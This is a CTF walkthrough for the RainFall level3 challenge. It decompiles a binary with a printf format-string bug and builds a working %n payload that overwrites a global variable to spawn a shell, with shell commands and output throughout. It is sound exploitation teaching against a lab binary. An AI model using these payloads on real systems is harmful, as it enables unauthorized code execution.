# Walkthrough

## Reversing

Let's reverse this thing:
```c
void main(void)
{
    v();
    return;
}

void v(void)
{
    char local_20c [520];

    fgets(local_20c,512,stdin);
    printf(local_20c);
    if (m == 64) {
        fwrite("Wait what?!\n",1,12,stdout);
        system("/bin/sh");
    }
    return;
}
```

Pretty obvius, it's clear that this is a format string vuln.

## Format String

We can do something like this to print the stack:
```bash
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

This works, because we instruct the printf-function to retrieve five parameters
from the stack and display them as 8-digit padded hexadecimal numbers.

Isn't it cool? I learned from this vuln existance in `42ctf.org`, so It's cool
to see that a rainfall challenge has it also.

Back then I needed to loop a list and print the `char*` of the last node, this
time is different, we probably need to change the value of `m`.

Let's play a little, and see if we can see our string in the stack:
```bash
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

To make it clear, let's run:
```bash
level3@RainFall:~$ ./level3
AAAA %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
```

We can see our input in the 4 position.

Since the binary does not have `PIE`, the address are always the same, so...

`printf` can also index to an arbitrary "argument" with the following syntax:
`%n$x` (where `n` is the decimal index of the argument you want). As an example,
if we want to leak our own buffer:
```bash
echo -e 'A%4$c' | ./level3
```

That would print our `A`, and the format `%4$c` that will be our `A`.

This is cool because with this vuln we can write an address, and dereference it
with `%4$s`, but, what we need to do is to overwrite the value of `m`...

## Exploit

The holy grail of exploitation is to take control of the instruction pointer
of a process. In most cases the instruction pointer (often named IP or PC) is a
register in the CPU and cannot be modified directly, since only machine
instructions can change it. But if we are able to issue those machine
instructions we already need to have control.

To accomplish this, we can use the `printf` specifier `%n`, that will write the
number of bytes already printed into a variable of our choice.

As an example of `%n`, this would print `i = 6`:
```c
int i;
printf ("foobar%n\n", &i);
printf ("i = %d\n", i);
```

Cool, so we can use `%n` to save the current bytes, but how can we "select"
where to save it? Well, everytime `printf` pops an argument, let's say, `%p`,
we increase the internal stack pointer of the format function by 4 bytes.

So, remember `%n` writes to an address, that means it writes to a memory
location, so, knowing that our string starts at 4 * 4 bytes...

First, obtain the address of the global variable `m`, with a decompiler or with
`nm`, that's the address we want to write to: `0804988c`

So our payload starts with the address we wanna writo to (in little endian):
```printf
printf '\x8c\x98\x04\x08' + "..." | ./level3
```

Then, we need to move the internal stack pointer 4 bytes, take this for
example:
```bash
level3@RainFall:~$ ./level3
AAAA%p%p%p%c
AAAA0x2000xb7fd1ac00xb7ff37d0A
```

We move the internal pointer 3 * 4 bytes, we do that with three `%p`, so next
time `printf` "reads an argument" from the stack, it will be from the start of
our format string, that's why the `%c` is printing an `A`.

So, `%n` will indeed save the written bytes to the direction we want:
```bash
printf '\x8c\x98\x04\x08%%p%%p%%p%%n\n' | ./level3
```

The only problem now is that we need `m` to be `64`, so, but knowing that `%n`
writes the number of bytes written up to that point... We just need to write
64 bytes before the `%n`, so just add bytes:
```bash
printf '\x8c\x98\x04\x08%%p%%p%%pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%%n\n' | ./level3
```

*Note: our `%p` where printing: `0x2000xb7fd1ac00xb7ff37d0`, thats 25 bytes already, plus the initial address 4 bytes, we need 35 'A'.*

Okey, that worked!

But, since the input ends, `/bin/sh` exits, we need to send the payload and
restore our stdin as input as we did in previous levels, let's create a script.

Check `./resources/exploit.sh`.

And that's it, another level, gg ez.
